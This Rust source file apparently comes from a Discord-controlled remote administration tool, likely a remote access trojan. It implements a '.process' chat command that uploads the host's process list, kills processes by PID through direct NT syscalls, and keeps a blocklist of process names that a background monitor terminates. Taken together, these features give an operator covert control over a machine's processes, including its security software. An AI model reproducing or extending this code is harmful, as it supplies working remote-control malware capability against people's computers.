use crate::prelude::*;
use std::fs::{self, OpenOptions};
use std::io::{Write};
use std::collections::HashSet;

#[poise::command(prefix_command, aliases("ps", "proc"))]
pub async fn process(
    ctx: PoiseContext<'_>,
    #[description = "Subcommand (list/kill/block/unblock/blocklist)"]
    #[rest]
    args: Option<String>,
) -> Result<(), Error> {
    let args = match args {
        Some(a) if !a.trim().is_empty() => a,
        _ => {
            ctx.say("ERROR: Missing subcommand\nUsage: `.process <list|kill|block|unblock|blocklist>`").await?;
            return Ok(());
        }
    };
    let mut parts = args.split_whitespace();
    let subcmd = parts.next().unwrap_or("").to_lowercase();

    match subcmd.as_str() {
        "list" | "ls" => {
            let processes = crate::utils::syscall::get_process_list();
            let mut output = String::from("PID   | Process Name\n--------------------\n");
            for (pid, name) in processes {
                output.push_str(&format!("{:<5} | {}\n", pid, name));
            }
            
            let attachment = serenity::CreateAttachment::bytes(output.into_bytes(), "processes.txt");
            let builder = poise::CreateReply::default().attachment(attachment).content("**Process List**");
            ctx.send(builder).await?;
        }
        "kill" => {
            if let Some(pid_str) = parts.next() {
                if let Ok(pid) = pid_str.parse::<u32>() {
                    let result = tokio::task::spawn_blocking(move || {
                        use crate::utils::syscall::{self, access};
                        if let Some(handle) = syscall::nt_open_process(pid, access::PROCESS_TERMINATE) {
                            let success = syscall::nt_terminate_process(handle, 1);
                            syscall::nt_close(handle);
                            Some(success)
                        } else {
                            None
                        }
                    }).await?;
                    
                    match result {
                        Some(true) => ctx.say(format!("Killed process PID: {}", pid)).await?,
                        Some(false) => ctx.say(format!("Failed to kill PID: {}", pid)).await?,
                        None => ctx.say(format!("Failed to open process PID: {}", pid)).await?,
                    };
                } else {
                    ctx.say("ERROR: Invalid PID").await?;
                }
            } else {
                ctx.say("ERROR: Usage: `.process kill <PID>`").await?;
            }
        }
        "block" => {
            if let Some(name) = parts.next() {
                let name = name.to_lowercase();
                let path = crate::installation::get_install_path().join("blocklist.json");
                let mut current_list = load_blocklist(&path);
                
                if current_list.contains(&name) {
                    ctx.say(format!("Process `{}` is already blocked.", name)).await?;
                } else {
                    current_list.insert(name.clone());
                    save_blocklist(&path, &current_list)?;
                    ctx.say(format!("Blocked process: `{}` (Monitor will kill it)", name)).await?;
                }
            } else {
                ctx.say("ERROR: Usage: `.process block <process_name>`").await?;
            }
        }
        "unblock" => {
            if let Some(name) = parts.next() {
                let name = name.to_lowercase();
                let path = crate::installation::get_install_path().join("blocklist.json");
                let mut current_list = load_blocklist(&path);
                
                if current_list.remove(&name) {
                    save_blocklist(&path, &current_list)?;
                    ctx.say(format!("Unblocked process: `{}`", name)).await?;
                } else {
                    ctx.say(format!("Process `{}` was not found in blocklist.", name)).await?;
                }
            } else {
                ctx.say("ERROR: Usage: `.process unblock <process_name>`").await?;
            }
        }
        "blocklist" => {
            let path = crate::installation::get_install_path().join("blocklist.json");
            let list = load_blocklist(&path);
            
            if list.is_empty() {
                ctx.say("Blocklist is empty.").await?;
            } else {
                let mut output = String::from("**Blocked Processes:**\n```\n");
                for name in list {
                    output.push_str(&format!("- {}\n", name));
                }
                output.push_str("```");
                ctx.say(output).await?;
            }
        }
        _ => {
            ctx.say("Usage: `.process <list|kill|block|unblock|blocklist>`").await?;
        }
    }

    Ok(())
}

fn load_blocklist(path: &std::path::Path) -> HashSet<String> {
    if let Ok(content) = fs::read_to_string(path) {
        content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
    } else {
        HashSet::new()
    }
}

fn save_blocklist(path: &std::path::Path, list: &HashSet<String>) -> std::io::Result<()> {
    let content = list.iter().cloned().collect::<Vec<String>>().join("\n");
    let mut file = OpenOptions::new().write(true).create(true).truncate(true).open(path)?;
    file.write_all(content.as_bytes())?;
    Ok(())
}